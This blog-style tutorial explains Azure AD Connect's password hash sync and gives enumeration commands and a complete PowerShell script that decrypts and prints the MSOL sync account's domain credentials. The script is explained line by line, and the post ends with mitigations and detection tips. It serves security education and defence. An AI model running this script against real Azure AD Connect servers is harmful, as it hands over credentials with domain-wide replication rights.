+++
tags = ["Windows", "Active Directory", "Azure AD Connect", "Azure", "SQL", "MSSQL"]
draft = false
title = "Azure AD Connect Exploitation & Privilege Escalation"
author = "bloodstiller"
date = 2024-10-14
+++

## Used-For: Connecting on-premises AD instances with Azure cloud instances {#used-for-connecting-on-premises-ad-instances-with-azure-cloud-instances}


## Overview: {#overview}

Azure AD Connect is a Microsoft tool designed to bridge on-premises Active Directory (AD) with Azure AD in the cloud. It offers several synchronization methods:


### Pass-through Authentication (PTA): {#pass-through-authentication--pta}

-   Validates users' passwords directly against on-premises AD
-   Enables enforcement of on-premises security and password policies


### Federated Authentication (ADFS): {#federated-authentication--adfs}

-   Uses a separate federated authentication system like AD FS
-   Provides advanced capabilities like multi-factor authentication and third-party MFA integration


### Password Hash Synchronization (PHS): {#password-hash-synchronization--phs}

-   Synchronizes a hash of the hash of users' passwords from on-premises AD to Azure AD
-   Allows for cloud-based authentication without on-premises infrastructure dependency


### Password Hash Synchronization (PHS) Method: {#password-hash-synchronization--phs--method}

Here's a simplified diagram illustrating the Password Hash Synchronization (PHS) method:

```nil
+----------------------+
|   On-Premises AD     |
+----------------------+
        |
        | "User accounts & attributes"
        v
+----------------------+
|   Azure AD Connect   |
| +------------------+ |
| | Azure AD Sync    | |
| |    Service       | |
| +------------------+ |
| +------------------+ |
| | Password Hash    | |
| | Sync Agent       | |
| +------------------+ |
+----------------------+
    |               |
    | "Synchronized | "Synchronized
    |  user accounts| password hashes"
    |  & attributes"|
    v               v
+----------------------+
|      Azure AD        |
+----------------------+

```

-   +Note+: Password hashes are further hashed before being sent to Azure AD for additional security.

This diagram illustrates the flow of data in the PHS method:

1.  User accounts and attributes are sent from the on-premises AD to the Azure AD Sync Service within Azure AD Connect.
2.  Password hashes are separately processed by the Password Hash Sync Agent.
3.  Synchronized user accounts and attributes are sent to Azure AD.
4.  Synchronized (and further hashed) password hashes are sent to Azure AD.

The separation of user data and password hash synchronization processes within Azure AD Connect is a key security feature, but it's also what allows for potential exploitation if an attacker gains access to the Azure AD Connect server.


### Installation Configurations: {#installation-configurations}

A default installation of Azure AD Connect uses a SQL Server Express instance as a `LocalDB`, connecting over a named pipe. This configuration is common and straightforward to set up.

However, it's important to note that custom installations are possible. In some cases, Azure AD Connect might be configured to use a full Microsoft SQL Server installation. This SQL Server could be bound to a port internally but not accessible externally. Such custom setups can occur when organizations have specific requirements or are integrating Azure AD Connect with existing database infrastructure.

Understanding the installation configuration is crucial for both security assessments and potential exploitation attempts. It affects how the system can be enumerated, what vulnerabilities might be present, and how any potential attacks could be carried out.


### The Vulnerability Context {#the-vulnerability-context}

The exploit we'll be discussing doesn't rely on a software bug, but rather on the architectural design of Azure AD Connect and potential misconfigurations in its deployment. This is particularly relevant to installations using Password Hash Synchronization (PHS).


### Technical Deep Dive {#technical-deep-dive}


#### 1. The MSOL Account {#1-dot-the-msol-account}

During installation, Azure AD Connect creates a service account named MSOL_[HEX]. This account is granted extensive permissions, including:

-   Replicating Directory Changes
-   Replicating Directory Changes All
-   Replicating Directory Changes In Filtered Set

These permissions allow the account to perform Directory Replication Service (DRS) operations, including +DCSync+.


#### 2. Password Hash Synchronization (PHS) Mechanism {#2-dot-password-hash-synchronization--phs--mechanism}

PHS uses the `Microsoft.Online.PasswordSynchronization.dll` assembly to handle hash synchronization. This DLL leverages the same DRS APIs used by tools like `Mimikatz` for +DCSync+ operations.


#### 3. Local Database Storage {#3-dot-local-database-storage}

Azure AD Connect stores its configuration in a SQL Server `LocalDB` instance by default. Key information includes:

-   Database: `ADSync`
-   Table: `mms_management_agent`
-   Fields of interest:
    -   `private_configuration_xml`
    -   `encrypted_configuration`


#### 4. Encryption Mechanism {#4-dot-encryption-mechanism}

The MSOL account password is encrypted and stored in the `encrypted_configuration` field. Decryption is handled by `mcrypt.dll`, located in the Azure AD Connect installation directory.

-   `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll`


## Enumerating Azure AD Connect: {#enumerating-azure-ad-connect}

Before attempting to exploit Azure AD Connect, it's important to confirm its presence and understand its configuration. Here's a structured approach to enumeration:


### 1. Confirm Azure AD Connect Installation: {#1-dot-confirm-azure-ad-connect-installation}

-   **Check for the Azure AD Connect installation directory**:
    ```powershell
      Test-Path "C:\Program Files\Microsoft Azure AD Sync"
    ```

-   **Check for Azure AD Connect service in the registry**:
    ```powershell
      Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
    ```

-   **Check for the Azure AD Connect synchronization service**:
    ```powershell
      Get-Service ADSync
    ```


### 2. Identify Azure AD Connect Accounts: {#2-dot-identify-azure-ad-connect-accounts}

-   **Search for** `MSOL_` **or** `AAD_` **accounts in Active Directory**:
    ```powershell
      Get-ADUser -Filter "samaccountname -like 'MSOL_*' -or samaccountname -like 'AAD_*'" -Properties *
    ```


### 3. Determine Database Configuration: {#3-dot-determine-database-configuration}

-   **Check for** `LocalDB` **(default configuration)**:
    ```powershell
      SqlLocalDB.exe info ADSync
    ```

-   **If** `LocalDB` **is not found, check for full SQL Server installation**:
    ```powershell
      Get-ChildItem "C:\Program Files\Microsoft SQL Server" -ErrorAction SilentlyContinue
    ```

    -   If this is found jump to step 5


### 4. `LocalDB` Enumeration (if applicable): {#4-dot-localdb-enumeration--if-applicable}

-   **List** `LocalDB` **instances**:
    ```powershell
      SqlLocalDB.exe info
    ```

-   **Start the ADSync instance if it's not running**:
    ```powershell
      SqlLocalDB.exe start ADSync
    ```

-   **Get the pipe name for the ADSync instance**:
    ```powershell
      SqlLocalDB.exe info ADSync | findstr "Instance pipe name"
    ```


### 5. SQL Server Enumeration (for custom installations): {#5-dot-sql-server-enumeration--for-custom-installations}

-   **Check for SQL Server network configuration**:
    ```powershell
      netstat -ano | findstr :1433
    ```

-   **Enumerate SQL Server instances**:
    ```powershell
      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
    ```

-   **Check for custom database configuration in Azure AD Connect files**:
    ```powershell
      Get-Content "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf"
    ```


### 6. Determine Synchronization Method (GUI only): {#6-dot-determine-synchronization-method--gui-only}

-   **Open the Synchronization Service Manager**:
    ```nil
      C:\Program Files\Microsoft Azure AD Sync\UIShell\miisclient.exe
    ```

-   In the "`Connectors`" tab, look for a connector of type "Windows Azure Active Directory (Microsoft)".

-   Check if the "Password Synchronization" column shows "Enabled" for Password Hash Synchronization.


### 7. Check for Required Permissions {#7-dot-check-for-required-permissions}

-   **Verify current user's group membership**:
    ```powershell
      whoami /groups
    ```

-   Look for "BUILTIN\Administrators" or "ADSyncAdmins" in the output.
-   +Note+: It is also worth checking if the user is part of any other Administrator groups with inherited permissions etc.


### 8. Check if we can interact with the database (SQL Custom installation): {#8-dot-check-if-we-can-interact-with-the-database--sql-custom-installation}

-   In this example if the default `LocalDB` is NOT being used we can see if it's possible to query the underlying database using `sqlcmd` (if it's installed)
    ```powershell
    sqlcmd -S <FQDNINSTANCE> -Q "SELECT name FROM master.dbo.sysdatabases"
    ```


## +Attacking Azure AD Connect+ {#88955c}


### Exploitating Azure AD Connect Using PowerShell: {#exploitating-azure-ad-connect-using-powershell}

**Here's a complete PowerShell script that demonstrates the exploitation process**:

-   This script must be run on the same machine as the Azure AD Connect server.
-   This script must be run with the same privileges as the MSOL account.
-   This script is by `@_xpn_` &amp; the original can be found here:
    -   <https://blog.xpnsec.com/azuread-connect-for-redteam/>
    -   <https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1>
-   +Note+:
    -   I am using this script and explaining it here for educational purposes.
    -   You can see my walkthrough for the box Monteverde to see a full demonstration of this in action.
        -   <https://bloodstiller.com/walkthroughs/monteverde-box/>

<!--listend-->

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

**Let's break down the key parts of this exploit**:


#### 1. Connecting to the `Database`: {#1-dot-connecting-to-the-database}

<!--list-separator-->

-  LocalDB Version:

    ```powershell
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
    $client.Open()
    ```

    **Line-by-line breakdown**:

    1.  `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"`
        -   Creates a new SqlConnection object to connect to the `LocalDB` instance.
        -   `"Data Source=(localdb)\.\ADSync"` specifies the `LocalDB` instance name.
        -   `"Initial Catalog=ADSync"` specifies the database name.

    2.  `$client.Open()`
        -   Opens the connection to the database.

<!--list-separator-->

-  SQL Server Version:

    ```powershell
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
    $client.Open()
    ```

    **Line-by-line breakdown**:

    1.  `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"`
        -   Creates a new SqlConnection object to connect to a full SQL Server instance.
        -   `"Server=127.0.0.1"` specifies the local machine's loopback address, as SQL is running internally.
        -   `"Database=ADSync"` specifies the database name.
        -   `"Integrated Security=True"` enables Windows Authentication, using the current user's credentials.
            -   The current user would need to have the correct permissions on the SQL database.

    2.  `$client.Open()`
        -   Opens the connection to the database.

    This version would be used if attacking a full SQL Server instance running locally on the host, rather than the standard `LocalDB` installation.


#### 2. Retrieving Encryption Keys {#2-dot-retrieving-encryption-keys}

```powershell
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
```

**Line-by-line breakdown**:

1.  `$cmd = $client.CreateCommand()`
    -   Creates a new SqlCommand object associated with the connection.

2.  `$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"`
    -   Sets the SQL query to retrieve encryption key information.

3.  `$reader = $cmd.ExecuteReader()`
    -   Executes the query and returns a SqlDataReader object.

4.  `$reader.Read() | Out-Null`
    -   Reads the first row of the result set.

5.  `$key_id = $reader.GetInt32(0)`
    -   Retrieves the keyset_id value from the first column.

6.  `$instance_id = $reader.GetGuid(1)`
    -   Retrieves the instance_id value from the second column.

7.  `$entropy = $reader.GetGuid(2)`
    -   Retrieves the entropy value from the third column.

8.  `$reader.Close()`
    -   Closes the reader to free up resources.


#### 3. Retrieving Encrypted Configuration {#3-dot-retrieving-encrypted-configuration}

```powershell
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
```

**Line-by-line breakdown**:

1.  `$cmd = $client.CreateCommand()`
    -   Creates a new SqlCommand object.

2.  `$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"`
    -   Sets the SQL query to retrieve the encrypted configuration for the AD management agent.

3.  `$reader = $cmd.ExecuteReader()`
    -   Executes the query and returns a SqlDataReader object.

4.  `$reader.Read() | Out-Null`
    -   Reads the first row of the result set.

5.  `$config = $reader.GetString(0)`
    -   Retrieves the private_configuration_xml value from the first column.

6.  `$crypted = $reader.GetString(1)`
    -   Retrieves the encrypted_configuration value from the second column.

7.  `$reader.Close()`
    -   Closes the reader.


#### 4. Decrypting the Configuration {#4-dot-decrypting-the-configuration}

```powershell
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

**Line-by-line breakdown**:

1.  `add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'`
    -   Loads the mcrypt.dll library for decryption.

2.  `$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager`
    -   Creates a new KeyManager object for handling encryption keys.

3.  `$km.LoadKeySet($entropy, $instance_id, $key_id)`
    -   Loads the key set using the previously retrieved entropy, instance_id, and key_id.

4.  `$key = $null`
    -   Initializes a variable to store the active credential key.

5.  `$km.GetActiveCredentialKey([ref]$key)`
    -   Retrieves the active credential key.

6.  `$key2 = $null`
    -   Initializes a variable to store a secondary key.

7.  `$km.GetKey(1, [ref]$key2)`
    -   Retrieves the secondary key (key ID 1).

8.  `$decrypted = $null`
    -   Initializes a variable to store the decrypted configuration.

9.  `$key2.DecryptBase64ToString($crypted, [ref]$decrypted)`
    -   Decrypts the encrypted configuration using the secondary key.


#### 5. Extracting Credentials {#5-dot-extracting-credentials}

```powershell
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

**Line-by-line breakdown**:

1.  `$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}`
    -   Extracts the domain from the configuration XML using XPath.

2.  `$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}`
    -   Extracts the username from the configuration XML using XPath.

3.  `$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}`
    -   Extracts the password from the decrypted configuration using XPath.

4.  `Write-Host ("Domain: " + $domain.Domain)`
    -   Displays the extracted domain.

5.  `Write-Host ("Username: " + $username.Username)`
    -   Displays the extracted username.

6.  `Write-Host ("Password: " + $password.Password)`
    -   Displays the extracted password.


### Exploiting AD Connect Using [adconnectdump](https://github.com/dirkjanm/adconnectdump?tab=readme-ov-file): {#exploiting-ad-connect-using-adconnectdump--20241014084307-adconnectdump-dot-md}

-   It is also possible to dump credentials using `dirkjanm`'s tools found in the [adconnect](https://github.com/dirkjanm/adconnectdump?tab=readme-ov-file) repo:
    -   There are 3 different tools available which require specific circumstances to use. I will not go into detail here.
    -   I am just adding as a reference.

-   **Building is required using Visual Studio**:
    -   {{< figure src="/ox-hugo/2024-10-14-090121_.png" >}}


## Example of this attack: {#example-of-this-attack}

-   See my walkthrough for the box Monteverde
    -   <https://bloodstiller.com/walkthroughs/monteverde-box/>


## Mitigation Strategies {#mitigation-strategies}

1.  Implement strict access controls on the Azure AD Connect server.
2.  Use Just-In-Time (JIT) access for administrative tasks.
3.  Enable and monitor advanced auditing for the MSOL account.
4.  Consider using Pass-through Authentication (PTA) instead of PHS if feasible.
5.  Regularly rotate the MSOL account password.
6.  Implement network segmentation to limit access to the Azure AD Connect server.
7.  Use a hardware security module (HSM) for key storage if possible.


## Detection {#detection}

Monitor for:

-   Unusual queries to the `LocalDB` instance
-   Attempts to load or access mcrypt.dll
-   Unexpected use of the MSOL account, especially for replication activities

By understanding this process, security teams can better protect their Azure AD Connect deployments and detect potential exploitation attempts.
